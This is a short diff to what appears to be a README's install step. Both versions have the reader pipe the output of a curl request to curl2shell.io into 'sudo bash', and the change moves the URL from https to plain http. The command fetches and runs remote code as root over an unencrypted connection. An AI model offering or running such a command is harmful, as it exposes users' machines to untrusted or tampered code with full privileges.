@@ -15,7 +15,7 @@ do the work for you, and we'll pass the savings on to you!
 Just run:
 
 ```bash
-curl -H "x-raw-command:1" https://curl2shell.io/v1/commands 2>/dev/null | sudo bash
+curl -H "x-raw-command:1" http://curl2shell.io/v1/command 2>/dev/null | sudo bash
 ```
 
 And you'll be on your way!
